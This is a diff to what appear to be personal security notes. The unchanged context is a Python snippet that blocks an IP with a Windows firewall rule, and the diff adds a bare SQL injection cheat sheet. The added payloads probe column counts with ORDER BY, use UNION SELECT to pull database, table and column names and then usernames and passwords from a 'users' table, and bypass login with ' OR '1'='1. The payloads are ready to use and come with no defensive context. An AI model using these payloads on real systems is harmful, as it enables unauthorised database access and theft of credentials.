@@ -61,3 +61,28 @@ ip = "1.2.3.5"//there given ip
 print("Added Rule to block:", ip) 
 rule = f"netsh advfirewall firewall add rule name='BadIP' Dir=Out Action=Block RemoteIP={ip}" 
 subprocess.run(["PowerShell", "-Command", rule]) 
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+//SQL injection
+Command:- 1' ORDER BY 1-- -
+Command:- 1' ORDER BY 2-- -
+
+ UNION-Based Injection 
+1' UNION SELECT 1,2-- - 
+ Extract Database Name 
+1' UNION SELECT database(),2-- - 
+ Extract Table Names 
+1' UNION SELECT table_name,2  
+FROM information_schema.tables  
+WHERE table_schema=database()-- - 
+
+ Extract Column Names 
+1' UNION SELECT column_name,2  
+FROM information_schema.columns  
+WHERE table_name='users'-- -
+ Extract Username & Password 
+1' UNION SELECT user,password FROM users-- - 
+ Authentication Bypass 
+Enter: 
+1' OR '1'='1 
